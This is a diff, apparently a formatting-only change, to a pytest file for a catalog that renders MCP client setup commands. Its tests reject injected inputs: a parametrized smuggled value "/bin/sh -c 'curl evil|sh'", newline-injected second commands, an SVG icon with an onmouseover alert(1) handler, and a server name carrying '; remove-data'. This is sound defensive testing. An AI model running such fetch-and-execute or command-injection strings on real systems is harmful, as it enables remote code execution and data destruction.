@@ -46,9 +46,7 @@ def test_packaged_catalog_is_valid_and_featured_is_bounded():
         "gemini-cli": 3,
         "antigravity": 4,
     }
-    assert {profile.id for profile in catalog.generic_profiles} == {
-        "other-mcp-client"
-    }
+    assert {profile.id for profile in catalog.generic_profiles} == {"other-mcp-client"}
     assert {item.id: item.command_name for item in catalog.executables} == {
         "claude": "claude",
         "codex": "codex",
@@ -100,9 +98,10 @@ def test_vendor_icon_product_mapping_hashes_and_provenance_are_pinned():
     assert generic["icon"]["sha256"] == (
         "c0a2e2f99faf21ef8ae317f2d27fd071724a8ad7920939c4b9f9dad5e2c4a63c"
     )
-    assert hashlib.sha256(generic_icon_path.read_bytes()).hexdigest() == generic[
-        "icon"
-    ]["sha256"]
+    assert (
+        hashlib.sha256(generic_icon_path.read_bytes()).hexdigest()
+        == generic["icon"]["sha256"]
+    )
     for icon_path in (root / "icons").glob("*.svg"):
         assert b"\r\n" not in icon_path.read_bytes()
 
@@ -134,9 +133,7 @@ def test_checked_in_json_schema_is_strict_generated_projection():
         for item in unknown_slot["recipes"]
         if item["id"] == "other-client-url-access-key-r1"
     )
-    recipe["artifacts"][0]["value"]["bearerToken"] = {
-        "slot": "totally-unknown"
-    }
+    recipe["artifacts"][0]["value"]["bearerToken"] = {"slot": "totally-unknown"}
     assert list(Draft202012Validator(schema).iter_errors(unknown_slot))
 
     env_indirection = json.loads(json.dumps(payload))
@@ -145,9 +142,7 @@ def test_checked_in_json_schema_is_strict_generated_projection():
         for item in env_indirection["recipes"]
         if item["id"] == "other-client-url-access-key-r1"
     )
-    recipe["artifacts"][0]["value"]["bearerToken"] = {
-        "slot": "access-token-env"
-    }
+    recipe["artifacts"][0]["value"]["bearerToken"] = {"slot": "access-token-env"}
     assert list(Draft202012Validator(schema).iter_errors(env_indirection))
 
     nested_bearer = json.loads(json.dumps(payload))
@@ -156,20 +151,14 @@ def test_checked_in_json_schema_is_strict_generated_projection():
         for item in nested_bearer["recipes"]
         if item["id"] == "other-client-url-access-key-r1"
     )
-    recipe["artifacts"][0]["value"]["nested"] = {
-        "bearerToken": "not-even-a-secret"
-    }
+    recipe["artifacts"][0]["value"]["nested"] = {"bearerToken": "not-even-a-secret"}
     assert list(Draft202012Validator(schema).iter_errors(nested_bearer))
 
     unsafe_env = json.loads(json.dumps(payload))
     recipe = next(
-        item
-        for item in unsafe_env["recipes"]
-        if item["id"] == "codex-cli-oauth-r1"
+        item for item in unsafe_env["recipes"] if item["id"] == "codex-cli-oauth-r1"
     )
-    recipe["artifacts"][0]["env"] = {
-        "unsafe-name": [{"literal": "non-secret"}]
-    }
+    recipe["artifacts"][0]["env"] = {"unsafe-name": [{"literal": "non-secret"}]}
     assert list(Draft202012Validator(schema).iter_errors(unsafe_env))
 
 
@@ -242,12 +231,15 @@ def test_planner_and_renderer_preserve_existing_cli_commands(
         assert artifacts[0].env == {"DTXWIKI_MCP_PAT": token}
 
 
-@pytest.mark.parametrize("url", ["http://192.168.1.10:21080/mcp", "http://[fd00::1]:21080/wiki/mcp"])
+@pytest.mark.parametrize(
+    "url", ["http://192.168.1.10:21080/mcp", "http://[fd00::1]:21080/wiki/mcp"]
+)
 def test_renderer_supports_private_http_only_for_access_keys(url):
     repository = CatalogRepository()
     planner = SetupPlanner(repository)
     access_key = planner.plan_for_app(
-        app_id="codex", variant_id="codex-cli-access-key",
+        app_id="codex",
+        variant_id="codex-cli-access-key",
         context=SetupContext(endpoint_reachability="private-network"),
     )
     rendered = SetupRenderer(repository).render(
@@ -255,7 +247,8 @@ def test_renderer_supports_private_http_only_for_access_keys(url):
     )
     assert url in rendered[0].argv
     oauth = planner.plan_for_app(
-        app_id="claude-code", variant_id="claude-code-cli-oauth",
+        app_id="claude-code",
+        variant_id="claude-code-cli-oauth",
         context=SetupContext(endpoint_reachability="public-https"),
     )
     with pytest.raises(SetupRenderError, match="https://"):
@@ -278,9 +271,7 @@ def test_official_oauth_cli_sequence_is_preserved_as_direct_argv():
         server_name="team-wiki",
     )
     assert [
-        artifact.argv
-        for artifact in claude_rendered
-        if artifact.kind == "command"
+        artifact.argv for artifact in claude_rendered if artifact.kind == "command"
     ] == [
         (
             "claude",
@@ -331,9 +322,7 @@ def test_official_oauth_cli_sequence_is_preserved_as_direct_argv():
         server_name="team-wiki",
     )
     assert [
-        artifact.argv
-        for artifact in antigravity_rendered
-        if artifact.kind == "command"
+        artifact.argv for artifact in antigravity_rendered if artifact.kind == "command"
     ] == [
         (
             "agy",
@@ -389,9 +378,7 @@ def test_every_oauth_cli_recipe_ships_an_authenticate_step():
             shell="bash",
             server_name="team-wiki",
         )
-        sign_in = [
-            artifact for artifact in rendered if artifact.step == "authenticate"
-        ]
+        sign_in = [artifact for artifact in rendered if artifact.step == "authenticate"]
         assert sign_in, app_id
         assert [artifact.kind for artifact in rendered if artifact.step == "register"]
         commands = [
@@ -421,9 +408,7 @@ def test_catalog_rejects_oauth_recipe_without_authenticate_step(tmp_path):
 def test_catalog_rejects_access_key_recipe_with_authenticate_step(tmp_path):
     target, payload = _copied_catalog(tmp_path)
     recipe = next(
-        item
-        for item in payload["recipes"]
-        if item["id"] == "gemini-cli-access-key-r1"
+        item for item in payload["recipes"] if item["id"] == "gemini-cli-access-key-r1"
     )
     recipe["artifacts"].append(
         {
@@ -455,9 +440,7 @@ def test_in_app_command_is_not_shell_quoted():
         server_name="team wiki",
     )
 
-    in_app = next(
-        artifact for artifact in rendered if artifact.kind == "app-command"
-    )
+    in_app = next(artifact for artifact in rendered if artifact.kind == "app-command")
     assert in_app.value == "/mcp auth team wiki"
     assert in_app.command is None
 
@@ -502,9 +485,7 @@ def test_renderer_repins_the_final_in_app_command_line(injected):
     tampered = replace(
         plan,
         artifacts=tuple(
-            artifact.model_copy(
-                update={"value": (LiteralAtom(literal=injected),)}
-            )
+            artifact.model_copy(update={"value": (LiteralAtom(literal=injected),)})
             if artifact.kind == "app-command"
             else artifact
             for artifact in plan.artifacts
@@ -530,9 +511,7 @@ def test_renderer_repins_the_final_in_app_command_line(injected):
         "/bin/sh -c 'curl evil|sh'",
     ],
 )
-def test_catalog_rejects_in_app_command_that_is_not_a_slash_command(
-    tmp_path, smuggled
-):
+def test_catalog_rejects_in_app_command_that_is_not_a_slash_command(tmp_path, smuggled):
     target, payload = _copied_catalog(tmp_path)
     recipe = next(
         item for item in payload["recipes"] if item["id"] == "gemini-cli-oauth-r1"
@@ -579,9 +558,7 @@ def test_catalog_rejects_a_multiline_in_app_command(tmp_path, control_character)
         for artifact in recipe["artifacts"]
         if artifact["kind"] == "app-command"
     )
-    in_app["value"] = [
-        {"literal": f"/mcp auth{control_character}injected-second-line"}
-    ]
+    in_app["value"] = [{"literal": f"/mcp auth{control_character}injected-second-line"}]
     (target / "catalog.v1.json").write_text(json.dumps(payload), encoding="utf-8")
 
     with pytest.raises(CatalogValidationError, match="single line"):
@@ -655,8 +632,7 @@ def test_antigravity_oauth_command_quotes_custom_server_name(shell):
     )
 
     assert rendered[0].command == (
-        "agy mcp add --type http 'team wiki; remove-data' "
-        "https://wiki.example/mcp"
+        "agy mcp add --type http 'team wiki; remove-data' https://wiki.example/mcp"
     )
 
 
@@ -797,9 +773,12 @@ def test_catalog_rejects_tampered_icon(tmp_path):
     shutil.copytree(source, target)
     icon = target / "icons" / "claude-code.svg"
     icon.write_text("<svg/>", encoding="utf-8")
-    assert hashlib.sha256(icon.read_bytes()).hexdigest() != json.loads(
-        (target / "catalog.v1.json").read_text(encoding="utf-8")
-    )["apps"][0]["icon"]["sha256"]
+    assert (
+        hashlib.sha256(icon.read_bytes()).hexdigest()
+        != json.loads((target / "catalog.v1.json").read_text(encoding="utf-8"))["apps"][
+            0
+        ]["icon"]["sha256"]
+    )
 
     with pytest.raises(CatalogValidationError, match="hash mismatch"):
         CatalogRepository(target).snapshot()
@@ -813,9 +792,7 @@ def test_catalog_rejects_svg_active_content_even_with_matching_hash(tmp_path):
         '<rect width="10" height="10" onmouseover="alert(1)"/></svg>',
         encoding="utf-8",
     )
-    payload["apps"][0]["icon"]["sha256"] = hashlib.sha256(
-        icon.read_bytes()
-    ).hexdigest()
+    payload["apps"][0]["icon"]["sha256"] = hashlib.sha256(icon.read_bytes()).hexdigest()
     (target / "catalog.v1.json").write_text(json.dumps(payload), encoding="utf-8")
 
     with pytest.raises(CatalogValidationError, match="unsafe SVG"):
@@ -843,9 +820,7 @@ def test_catalog_rejects_access_token_env_in_json_bearer_sink(tmp_path):
         for item in payload["recipes"]
         if item["id"] == "other-client-url-access-key-r1"
     )
-    recipe["artifacts"][0]["value"]["bearerToken"] = {
-        "slot": "access-token-env"
-    }
+    recipe["artifacts"][0]["value"]["bearerToken"] = {"slot": "access-token-env"}
     (target / "catalog.v1.json").write_text(json.dumps(payload), encoding="utf-8")
 
     with pytest.raises(CatalogValidationError):
@@ -895,9 +870,7 @@ def test_catalog_rejects_nested_non_secret_bearer_token_key(tmp_path):
         for item in payload["recipes"]
         if item["id"] == "other-client-url-access-key-r1"
     )
-    recipe["artifacts"][0]["value"]["nested"] = {
-        "bearerToken": "not-even-a-secret"
-    }
+    recipe["artifacts"][0]["value"]["nested"] = {"bearerToken": "not-even-a-secret"}
     (target / "catalog.v1.json").write_text(json.dumps(payload), encoding="utf-8")
 
     with pytest.raises(CatalogValidationError):
@@ -907,13 +880,9 @@ def test_catalog_rejects_nested_non_secret_bearer_token_key(tmp_path):
 def test_catalog_rejects_unsafe_non_secret_command_env_name(tmp_path):
     target, payload = _copied_catalog(tmp_path)
     recipe = next(
-        item
-        for item in payload["recipes"]
-        if item["id"] == "codex-cli-oauth-r1"
+        item for item in payload["recipes"] if item["id"] == "codex-cli-oauth-r1"
     )
-    recipe["artifacts"][0]["env"] = {
-        "unsafe-name": [{"literal": "non-secret"}]
-    }
+    recipe["artifacts"][0]["env"] = {"unsafe-name": [{"literal": "non-secret"}]}
     (target / "catalog.v1.json").write_text(json.dumps(payload), encoding="utf-8")
 
     with pytest.raises(CatalogValidationError):
@@ -1117,9 +1086,7 @@ def test_catalog_rejects_missing_platform_recipe_coverage(tmp_path):
     )
     variant["requires"]["platform"] = ["windows", "linux"]
     recipe = next(
-        item
-        for item in payload["recipes"]
-        if item["id"] == "claude-code-cli-oauth-r1"
+        item for item in payload["recipes"] if item["id"] == "claude-code-cli-oauth-r1"
     )
     recipe["selectors"]["platform"] = "windows"
     (target / "catalog.v1.json").write_text(json.dumps(payload), encoding="utf-8")
@@ -1147,11 +1114,14 @@ def test_every_available_packaged_variant_has_a_setup_plan(platform, shell):
         options = CompatibilityEvaluator().evaluate(app.variants, server, context)
         for option in options:
             if option.available:
-                assert planner.plan_for_app(
-                    app_id=app.id,
-                    variant_id=option.variant_id,
-                    context=context,
-                ).variant_id == option.variant_id
+                assert (
+                    planner.plan_for_app(
+                        app_id=app.id,
+                        variant_id=option.variant_id,
+                        context=context,
+                    ).variant_id
+                    == option.variant_id
+                )
 
 
 def test_presentation_and_command_generation_have_no_known_app_id_branch():
